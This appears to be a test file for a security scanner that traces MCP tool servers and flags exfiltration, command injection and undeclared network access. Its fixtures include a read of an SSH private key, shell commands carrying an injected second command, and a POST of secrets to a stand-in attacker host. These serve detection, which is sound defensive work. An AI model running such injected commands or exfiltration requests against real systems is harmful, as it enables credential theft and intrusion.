"""Dynamic prober: trace parsing and finding logic (no Docker needed)."""

import base64

from mcpguard.dynamic.inputs import generate_cases
from mcpguard.dynamic.prober import Observation, analyze, parse_log
from mcpguard.findings import Category, Severity, ToolDef, ToolVerdict

TOKEN = "abc123def4567890"
MARKER = f"MCPG-INJ-{TOKEN}"


def _sink(raw: str) -> str:
    first = raw.split("\r\n", 1)[0]
    return f"MCPG-SINK {first} {base64.b64encode(raw.encode()).decode()}"


def test_parse_strace_and_sink_lines():
    text = "\n".join([
        '42 openat(AT_FDCWD, "/home/mcp/.ssh/id_rsa", O_RDONLY|O_CLOEXEC) = 6',
        '[pid    43] execve("/bin/sh", ["/bin/sh", "-c", "ping -c 1 x; echo X"], 0x7ffd /* 9 vars */) = 0',
        '42 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH',
        _sink("POST http://evil.invalid/c HTTP/1.1\r\nHost: evil.invalid\r\n\r\nk=secret"),
        "some unrelated server log line",
    ])
    obs = Observation(tool="t")
    parse_log(text, obs)
    assert obs.opened == [("/home/mcp/.ssh/id_rsa", 6)]
    assert obs.execs[0][0] == "/bin/sh"
    assert obs.connects == [("93.184.216.34", 443)]
    assert obs.http[0]["host"] == "evil.invalid" and "k=secret" in obs.http[0]["raw"]


def _verdict(tool, caps):
    return ToolVerdict(tool=tool, claimed_capabilities=caps)


def test_canary_in_traffic_is_critical_exfiltration():
    obs = Observation(tool="get_weather")
    parse_log(_sink(f"POST http://x.invalid/ HTTP/1.1\r\nHost: x.invalid\r\n\r\nMCPG-CANARY-SSH-{TOKEN}"), obs)
    findings = analyze([obs], [_verdict("get_weather", ["network"])], TOKEN, MARKER)
    assert findings[0].severity == Severity.CRITICAL and findings[0].category == Category.EXFILTRATION


def test_injection_confirmed_from_exec_and_output():
    obs = Observation(tool="ping_host")
    parse_log(f'7 execve("/bin/sh", ["/bin/sh", "-c", "ping -c 1 127.0.0.1; echo {MARKER}"], 0x0) = 0', obs)
    obs.outputs.append(({"host": "x"}, f"PING failed\n{MARKER}\n"))
    findings = analyze([obs], [_verdict("ping_host", ["exec"])], TOKEN, MARKER)
    assert [(f.category, f.severity) for f in findings] == [(Category.COMMAND_INJECTION, Severity.CRITICAL)]


def test_echoed_payload_is_not_injection():
    obs = Observation(tool="echo")
    obs.outputs.append(({"text": "x"}, f"You said: 127.0.0.1; echo {MARKER}"))
    assert analyze([obs], [_verdict("echo", ["none"])], TOKEN, MARKER) == []


def test_undeclared_network_is_flagged_declared_is_info():
    raw = "GET http://api.example/ HTTP/1.1\r\nHost: api.example\r\n\r\n"
    a, b = Observation(tool="calc"), Observation(tool="weather")
    parse_log(_sink(raw), a)
    parse_log(_sink(raw), b)
    fa = analyze([a], [_verdict("calc", ["none"])], TOKEN, MARKER)
    fb = analyze([b], [_verdict("weather", ["network"])], TOKEN, MARKER)
    assert fa[0].severity == Severity.MEDIUM and fa[0].category == Category.BEHAVIOR_MISMATCH
    assert fb[0].severity == Severity.INFO


def test_generate_cases_include_injection_payloads():
    tool = ToolDef(name="ping", inputSchema={"type": "object", "properties": {"host": {"type": "string"}},
                                              "required": ["host"]})
    cases = generate_cases(tool, MARKER)
    assert cases[0] == {"host": "127.0.0.1"}
    assert any(MARKER in c["host"] for c in cases[1:])
